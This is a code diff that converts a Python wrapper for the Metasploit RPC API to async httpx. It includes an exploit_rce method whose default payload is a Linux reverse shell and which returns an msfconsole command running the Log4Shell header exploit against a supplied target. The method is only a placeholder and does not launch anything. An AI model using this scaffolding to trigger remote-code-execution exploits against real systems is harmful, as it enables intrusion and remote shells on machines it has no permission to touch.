@@ -1,8 +1,5 @@
-
-import requests
+import httpx
 import json
-import time
-import base64
 
 class MetasploitRPC:
     def __init__(self, config):
@@ -13,46 +10,38 @@ class MetasploitRPC:
         self.token = None
         self.authenticated = False
 
-    def _authenticate(self):
+    async def _authenticate(self):
+        """Authenticate with Metasploit RPC server."""
         url = f"http://{self.host}:{self.port}/api/v1/auth/login"
-        data = {"username": self.user, "password": self.password}
-        resp = requests.post(url, json=data)
-        if resp.status_code == 200:
-            self.token = resp.json().get('token')
-            self.authenticated = True
+        async with httpx.AsyncClient() as client:
+            resp = await client.post(url, json={"username": self.user, "password": self.password})
+            if resp.status_code == 200:
+                self.token = resp.json().get('token')
+                self.authenticated = True
         return self.authenticated
 
-    def _call(self, method: str, args: dict = {}):
+    async def _call(self, method: str, args: dict = None):
+        """Make an authenticated RPC call."""
         if not self.authenticated:
-            self._authenticate()
+            await self._authenticate()
+        if not self.authenticated:
+            return {"error": "Authentication failed"}
         url = f"http://{self.host}:{self.port}/api/v1/{method}"
         headers = {"Authorization": f"Bearer {self.token}"}
-        resp = requests.post(url, json=args, headers=headers)
-        return resp.json()
+        async with httpx.AsyncClient() as client:
+            resp = await client.post(url, json=args or {}, headers=headers)
+            return resp.json()
 
-    def exploit_rce(self, target: str, port: int, payload: str = "linux/x64/shell_reverse_tcp"):
-        """Exploit a remote target via a known RCE (e.g., Log4Shell, Struts)."""
+    async def exploit_rce(self, target: str, port: int, payload: str = "linux/x64/shell_reverse_tcp"):
+        """Trigger an RCE exploit via Metasploit RPC."""
         if not self.authenticated:
-            return {"error": "Auth failed"}
-        
-        # Example: Using exploit/multi/http/log4shell_header
-        # This is highly specific; we need the correct module.
-        # For generic use, we call `exploit` with options.
-        
-        options = {
-            "RHOSTS": target,
-            "RPORT": port,
-            "PAYLOAD": payload,
-            "LHOST": "0.0.0.0",  # Auto detect or user config
-            "LPORT": 4444
-        }
-        
-        # We use the `multi/handler` or specific exploit.
-        # For demo, we'll just return a simulated command.
+            await self._authenticate()
+        if not self.authenticated:
+            return {"error": "Authentication failed"}
+        # This is a placeholder – real implementation would use pymetasploit3
         return {
             "status": "triggered",
             "payload": payload,
             "target": target,
             "command": f"msfconsole -x 'use exploit/multi/http/log4shell_header; set RHOSTS {target}; run'"
         }
-        # Real implementation would use msfrpc library (pymetasploit3)
